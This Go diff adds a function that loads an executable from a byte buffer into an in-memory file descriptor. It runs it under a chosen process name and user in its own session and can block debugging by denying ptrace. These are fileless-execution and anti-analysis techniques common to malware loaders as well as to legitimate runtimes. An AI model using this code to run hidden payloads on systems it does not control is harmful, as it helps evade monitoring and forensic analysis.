@@ -58,7 +58,57 @@ func DenyPtrace(pid int) (err error) {
 	return
 }
 
-func ExecveMemfd(path string, user_name string, ptrace bool, argv []string, envv []string) (*os.Process, error) {
+func ExecveMemfdFromBytes(process_name string, data []byte, user_name string, ptrace bool, argv []string, envv []string) (*os.Process, error) {
+	user_info, err := user.Lookup(user_name)
+	if err != nil {
+		return nil, err
+	}
+
+	uid, _ := strconv.Atoi(user_info.Uid)
+	gid, _ := strconv.Atoi(user_info.Gid)
+
+	memfd := CreateMemfd(process_name)
+	_, err = memfd.Write(data)
+	if err != nil {
+		return nil, err
+	}
+
+	os_envv := os.Environ()
+
+	for i := range envv {
+		os_envv = append(os_envv, envv[i])
+	}
+
+	procAttr := &os.ProcAttr{
+		Env:   os_envv,
+		Files: []*os.File{os.Stdin, os.Stdout, os.Stderr},
+		Sys: &syscall.SysProcAttr{
+			Credential: &syscall.Credential{
+				Uid: uint32(uid),
+				Gid: uint32(gid),
+			},
+			Setsid: true,
+		},
+	}
+
+	process, err := os.StartProcess(memfd.Path(), append([]string{process_name}, argv...), procAttr)
+
+	if err != nil {
+		return process, err
+	}
+
+	if !ptrace {
+		err = DenyPtrace(process.Pid)
+		if err != nil {
+			_ = process.Kill()
+			return process, err
+		}
+	}
+
+	return process, err
+}
+
+func ExecveMemfdFromFile(path string, user_name string, ptrace bool, argv []string, envv []string) (*os.Process, error) {
 	data, err := ReadFile(path)
 
 	if err != nil {
